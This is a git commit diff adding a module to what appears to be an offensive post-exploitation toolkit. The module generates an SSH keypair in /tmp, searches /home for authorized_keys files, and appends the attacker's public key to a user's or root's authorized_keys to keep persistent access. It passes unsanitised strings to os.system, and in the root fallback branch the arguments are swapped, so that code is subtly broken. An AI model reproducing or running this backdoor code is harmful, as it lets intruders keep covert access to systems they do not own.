b283993bc0fac1a9c47ac1eaeb7bb564d1da1f7e
dd <54325660+sud0k1ller@users.noreply.github.com>
2021-03-25 11:25:22 +0100

    Module for adding authorized SSH key

--- modules/ssh_auth_keys.py
+++ modules/ssh_auth_keys.py
@@ -4,26 +4,39 @@
 #KEY_PATH,no,Path to generated SSH key
 #END
 import os
+import random
+import string
+import pathlib
 
 def generate_ssh_key(): #Generates new ssh key and stores it in /tmp
-    ssh_key_file_path="/tmp/"
+    ssh_key_file_path = '/tmp/' + ''.join((random.choice(string.ascii_letters)) for i in range(10))
+    os.system("ssh-keygen -q -t rsa -N '' -f " + ssh_key_file_path)
+    
+    ssh_key_file_path += ".pub"
     return ssh_key_file_path
 
-def find_available_auth_files(): #Looks for authorized_keys in /home subdirectories
-    pass
+def find_available_auth_file(): #Looks for authorized_keys in /home subdirectories
+    auth_files_table = []
+    for path in pathlib.Path('/home').rglob('authorized_keys'):
+        auth_files_table.append(str(path.resolve()))
+    if len(auth_files_table):
+        return auth_files_table[0] 
+    else:
+        return False
 
-def copy_key_to_auth_file(auth_file_path, ssh_key_file_path):
-    pass
-
+def copy_key_to_auth_file(ssh_key_file_path, auth_file_path):
+    os.system("cat " + ssh_key_file_path + " >> " + auth_file_path )
 
 def main(arguments):
-    if arguments[1] == "" #No custom SSH key given
+    if arguments[1] == "": #No custom SSH key given
         arguments[1] = generate_ssh_key()
 
     if arguments[0] == "": #No username given
-        if available_auth_file = find_available_auth_file():
-            copy_key_to_auth_file(available_auth_file, arguments[1])
+        available_auth_file = find_available_auth_file()
+        if available_auth_file:
+            copy_key_to_auth_file(arguments[1], available_auth_file)
         else:
-            pass
+            copy_key_to_auth_file("/root/.ssh/authorized_keys", arguments[1])
     else:
-        pass
+        copy_key_to_auth_file(arguments[1], "/home/" + arguments[0] + "/.ssh/authorized_keys")
+
